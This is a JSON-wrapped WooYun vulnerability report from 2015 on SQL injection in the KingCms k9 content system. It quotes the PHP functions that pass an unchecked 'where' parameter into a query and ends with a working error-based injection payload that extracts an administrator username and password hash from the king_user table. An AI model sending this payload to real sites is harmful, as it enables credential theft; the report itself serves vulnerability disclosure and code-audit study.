{"id": 36154, "wybug_id": "wooyun-2015-0102490", "wybug_title": "KingCms最新版（k9）注入3枚打包", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-20 14:16", "wybug_open_date": "2015-05-04 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）注入3枚打包 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 注入点：POST /apps/store/index.php HTTP/1.1注入参数：where 问题文件在 /apps/store/index.php当$cmd分别为store,news,product时，分别会有三个漏洞，这里以$cmd=store为例进行说明。\nfunction _create(){\t$u=new user;$u->auth_role('store');\t$db=new db;\t$where=kc_get('where',0,1);\t$pid=kc_get('pid',2,1);\t$rn=kc_get('rn',2,1);\t$limit=($rn*($pid-1)).','.$rn.';';\t$cmd=kc_get('cmd',array('categroy','store','news','product'));\t$pcount=kc_get('pcount',2,1);\t$start=$rn*$pid>$pcount?$pcount:$rn*$pid;\t$file=new file;\t$fpath=kc_config('store.url');\tif($cmd=='categroy'){\t\t$res=$db->getRows('%s_store_categroy','*');\t\tforeach($res as $rs){\t\t\t$rs['TEMPLATE']='store/'.(empty($rs['template'])?'categroy.php':$rs['template']);\t\t\t$file->create($rs['url'],$rs);\t\t}\t}else if($cmd=='store'){\t\t$sids=$db->getRows_two('%s_store','sid','sid',$where,'',$limit);\t\t$store=new store;\t\t$store->create($sids);\t}else if($cmd=='news'){\t\t$res=$db->getRows('%s_store_news','*',$where,'',$limit);\t\t$store_urls=array();\t\tforeach($res as $rs){\t\t\tif(empty($store_urls[$rs['sid']])){\t\t\t\t$store=$db->getRows_one('%s_store','url','sid='.$rs['sid']);\t\t\t\tif(empty($store)){\t\t\t\t\t$db->delete('%s_store_news','sid='.$sid);\t\t\t\t\tkc_tip('所属店铺数据丢失，已删除对应数据，请重新生成！','form');\t\t\t\t}\t\t\t\t$store_urls[$rs['sid']]=$store['url'];\t\t\t}\t\t\t$url=$store_urls[$rs['sid']];\t\t\t\t\t\t$rs['tmpfile']='news.page.php';\t\t\t$file->create($url.'news/n'.$rs['id'].'/',$rs,$url.'config.php');\t\t}\t}else if($cmd=='product'){\t\t$res=$db->getRows('%s_store_product','*',$where,'',$limit);\t\t$store_urls=array();\t\tforeach($res as $rs){\t\t\tif(empty($store_urls[$rs['sid']])){\t\t\t\t$store=$db->getRows_one('%s_store','url','sid='.$rs['sid']);\t\t\t\tif(empty($store)){\t\t\t\t\t$db->delete('%s_store_product','sid='.$sid);\t\t\t\t\tkc_tip('所属店铺数据丢失，已删除对应数据，请重新生成！','form');\t\t\t\t}\t\t\t\t$store_urls[$rs['sid']]=$store['url'];\t\t\t}\t\t\t$url=$store_urls[$rs['sid']];\t\t\t\t\t\t$rs['tmpfile']='product.page.php';\t\t\t$file->create($url.'product/n'.$rs['id'].'/',$rs,$url.'config.php');\t\t}\t}\t\t$js=\"\\$.kc_progress('#progress_{$cmd}',{$start},{$pcount});\";\t$js.=$start==$pcount ? \"\\$('.Submit').removeAttr('disabled');\":\"\\$.kc_ajax({URL:'\".FULLURL.\"apps/store/index.php',CMD:'create',cmd:'$cmd',where:'$where',pid:\".($pid+1).\",rn:{$rn},pcount:{$pcount}});\";\tkc_ajax(array('JS'=>$js));}\n又调用了kc_validate，再去看看\nfunction kc_validate($s,$type){\t$reg='';\tswitch($type){\t\tcase 1:$reg='/^[a-zA-Z0-9]+$/';break;\t\tcase 2:$reg='/^[0-9]+$/';break;\t\tcase 3:$reg='/^([0-9]+,)*[0-9]+$/';break;\t\tcase 4:$reg='/^[A-Za-z0-9\\_]+$/';break;\t\tcase 5:\t\t\t$reg='/^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$/';break;\t\tcase 6:\t\t\t$reg='/^[a-zA-Z]{3,10}:\\/\\/[^\\s]+$/';\t\t\tbreak;\t\tcase 7:\t\t\t$reg='/^([a-zA-Z]{3,10}:\\/\\/)?[^\\s]+\\.(jpeg|jpg|gif|png|bmp)$/';\t\t\tbreak;\t\tcase 8:\t\t\t$reg='/^((((1[6-9]|[2-9]\\d)\\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\\d|3[01]))|(((1[6-9]|[2-9]\\d)\\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\\d|30))|(((1[6-9]|[2-9]\\d)\\d{2})-0?2-(0?[1-9]|1\\d|2[0-8]))|(((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29)) (20|21|22|23|[0-1]?\\d):[0-5]?\\d:[0-5]?\\d$/';\t\t\tbreak;\t\tcase 9:\t\t\t$reg='/^((((1[6-9]|[2-9]\\d)\\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\\d|3[01]))|(((1[6-9]|[2-9]\\d)\\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\\d|30))|(((1[6-9]|[2-9]\\d)\\d{2})-0?2-(0?[1-9]|1\\d|2[0-8]))|(((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29))$/';\t\t\tbreak;\t\tcase 10:$reg='/^\\d?\\.\\d?\\.\\d{4}$/';break;\t\tcase 11:$reg='/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/';break;\t\tcase 12:$reg='/^(\\d+(\\.\\d+)?)$/';break;\t\tcase 13:$reg='/^([0-9A-Za-z]+,)*[0-9A-Za-z]+$/';break;\t\tcase 14:$reg='/^#?[0-9A-Fa-f]{6}$/';break;\t\tcase 15:$reg='/^([a-zA-Z0-9\\_\\-]+\\/)+$/';\t\t\t$s=preg_replace('/\\{([a-zA-Z0-9]+)\\}/','$1',$s);//替换{ID}等类型为ID\t\t\t$path=preg_replace('/(([a-zA-Z0-9\\_\\-]+\\/)*)([a-zA-Z0-9\\_\\-]+\\/)/','$3',$s);\t\t\t//kc_tip($path,'form');\t\t\t//if(preg_match('/^[pP]\\d+$/',$path)){return false;}\t\t\tbreak;\t\tcase 17:$reg='/^([a-zA-Z]{3,10}:\\/\\/)[^\\s]+$/';break;\t\tcase 18:\t\t\t$reg='/^((((1[6-9]|[2-9]\\d)\\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\\d|3[01]))|(((1[6-9]|[2-9]\\d)\\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\\d|30))|(((1[6-9]|[2-9]\\d)\\d{2})-0?2-(0?[1-9]|1\\d|2[0-8]))|(((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29)) (20|21|22|23|[0-1]?\\d):[0-5]?\\d$/';\t\t\tbreak;\t\tcase 22:$reg='/^(\\-|\\+)?[0-9]+$/';break;\t\tcase 23:$reg='/^[a-zA-Z][a-zA-Z0-9\\_]*/';break;\t\tcase 24:$reg='/^([a-zA-Z0-9\\-_]+\\/)+$/';break;\t\tcase 25:$reg='/[a-zA-Z0-9\\+\\%]+(\\=)*$/';break;\t\tcase 33:$reg='/^(\\-?[0-9]+\\,?)+$/';break;\t\tcase 34:$reg=\"/^[^\\s!-\\/:-@\\[-`\\{-~]+$/\";break;\t\tdefault:$reg=$type;break;\t}\t//如果为数组类型\tif (is_array($reg)) {\t\t$bool=in_array($s,$reg);\t}else{\t\t$bool= empty($type)\t\t\t? true\t\t\t: (empty($reg) ? false : (bool)preg_match($reg,$s));\t}\treturn $bool;}\n因为在使用kc_get得到where时，参数type是0，因此，kc_validate的参数type也是0，也就使得kc_validate返回true。也就是说再得到where时，没有对where进行类型的检验，可以引入单引号，造成了注入。$_POST['where']进入$db->getRows，去看看$db->getRows\npublic function getRows($table,$insql='*',$where=null,$order=null,$limit=null,$group=null) {\t\t$table=str_replace('%s',DB_PRE,$table);\t\t$sql=\"SELECT $insql FROM $table \";\t\t$sql.= empty($where) ? '' : \" WHERE $where\";\t\t$sql.= empty($group) ? '' : \" GROUP BY $group\";\t\t$sql.= empty($order) ? '' : \" ORDER BY $order\";\t\t$sql.= empty($limit) ? '' : \" LIMIT $limit\";\t\treturn $this->get($sql);\t}\n在执行sql语句之前，也没有过滤，这里就造成了注入。Kingcms可以报错，因此Payload：\njsoncallback=1&_=11&URL=http%3A%2F%2Flocalhost%2Fapps%2Fcontent%2Fcategroy.php&CMD=create&TID=1&AJAX=1&USERID=10000&SIGN=89ee81f5f1f328f555ceb7e7655d9f2f&pid=1&rn=2&cmd=content&pcount=1&where=0 UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,userpass)FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a%23\n注入成功，见下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}